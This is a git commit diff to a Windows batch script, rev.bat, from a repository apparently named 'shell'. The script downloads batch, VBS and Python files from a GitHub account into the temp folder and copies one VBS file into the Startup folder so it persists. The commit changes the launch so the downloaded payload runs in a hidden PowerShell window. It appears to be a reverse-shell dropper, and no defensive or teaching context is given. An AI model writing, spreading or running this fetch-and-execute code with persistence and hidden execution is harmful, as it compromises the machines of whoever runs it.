b66b06b3f2ac5f37608ff4a10abac5ae413d6825
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-05 07:32:22 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -1,11 +1,11 @@
 @echo off
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
-curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o %temp%\vb.vbs
+curl https://raw.githubusercontent.com/0x2034/shell/main/vb.bat -o %temp%\vb.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%temp%\vb1.vbs"
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%temp%\post.bat"
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
 move "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-start /wait %temp%\vb.vbs
+powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
 call "%temp%\vb1.vbs"
 exit
